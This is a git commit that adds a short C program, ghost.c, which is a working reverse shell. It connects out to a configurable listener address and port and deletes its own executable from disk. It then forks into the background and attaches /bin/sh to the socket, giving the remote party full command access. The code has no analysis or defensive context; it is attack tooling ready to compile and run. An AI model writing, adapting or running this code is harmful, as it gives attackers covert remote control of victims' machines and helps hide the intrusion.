9a07b890e67466b084fe7ffc9090122f19c34270
Arjun Ghoshal <94633408+Arjun4522@users.noreply.github.com>
2023-08-30 01:11:05 +0530

    Update and rename inmem.c to ghost.c

---
+++ ghost.c
@@ -0,0 +1,50 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+
+int main(int argc, char* argv[]) {
+
+    argv[1]="10.0.0.3";   //ADD LHOST
+    argv[2]="1234";        //ADD LPORT
+
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(argv[1]);
+    sa.sin_port = htons(atoi(argv[2]));
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
+        perror("Failed to connect");
+        exit(errno);
+    }
+   
+    remove(argv[0]);
+
+    pid_t pid = fork();
+    if (pid == -1) {
+        perror("Failed to fork");
+        close(s);
+        exit(errno);
+    } else if (pid > 0) {
+        exit(0);
+    }
+
+    dup2(s, 0);  
+    dup2(s, 1);  
+    dup2(s, 2);  
+
+    char* shell_args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", shell_args, NULL);
+
+    perror("Failed to execute shell");
+    close(s);
+    
+    return errno;
+}
